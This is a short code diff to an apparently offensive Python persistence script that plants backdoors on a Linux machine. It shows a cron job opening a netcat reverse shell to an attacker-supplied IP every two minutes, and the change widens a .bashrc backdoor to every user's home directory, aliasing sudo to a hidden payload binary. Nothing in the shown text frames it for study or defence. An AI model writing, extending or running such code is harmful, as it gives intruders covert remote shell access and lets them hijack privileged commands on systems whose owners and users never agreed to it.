@@ -1,3 +1,4 @@
+import os
 import subprocess
 import sys
 
@@ -10,9 +11,11 @@ def createCronTabBackDoor(ip):
 	subprocess.run(f'(crontab -l ; echo "*/2 * * * * sleep 200 && nc {ip} 8888 -e /bin/bash") | crontab 2> /dev/null')
 
 def backDoorBashRC():
-	with open('~/.bashrc', 'a') as bashrc:
-		bashrc.write('chmod u+x /etc/default/.cron.d/sudoy')
-		bashrc.write('alias sudo=/etc/default/.cron.d/sudoy')
+	userHomeDirs = os.listdir('/home')
+	for user in userHomeDirs:
+		with open(f'/home/{user}/.bashrc', 'a') as bashrc:
+			bashrc.write('chmod u+x /etc/default/.cron.d/sudoy')
+			bashrc.write('alias sudo=/etc/default/.cron.d/sudoy')
 
 	subprocess.run('mv ./payloads/sudoy /etc/default/.cron.d/sudoy')
 
